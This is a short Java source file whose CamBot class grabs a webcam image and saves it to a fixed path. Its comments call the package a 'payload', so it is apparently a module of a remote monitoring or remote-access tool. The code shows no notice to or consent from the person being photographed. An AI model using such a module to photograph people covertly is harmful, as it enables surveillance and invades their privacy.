package main;

import java.io.File;
import java.io.IOException;

import javax.imageio.ImageIO;

import com.github.sarxos.webcam.Webcam;

public class CamBot
{
	/**
	 * CamBot requires dependencies for Sarxos Webcam Capture.
	 * If this is not a needed function in your environment,
	 * please exclude them to reduce payload size, and comment out the imports
	 * in this file.
	 * 
	 */
	public static void snapImg() throws IOException
	{
		try 
		{
			Webcam wc = Webcam.getDefault();
			wc.open();
			File tgt = new File ("C:/ClassPolicy/cam.png");
			if (tgt.exists()) {
				tgt.delete();
			}
			ImageIO.write(wc.getImage(), "PNG", tgt);
			Chocolat.println("[CamBot] Successfully snapped a shot!");
		} 
		catch (Exception e)
		{
			Chocolat.println("[CamBot] Encountered an exception: " + e);
		}
	}
}
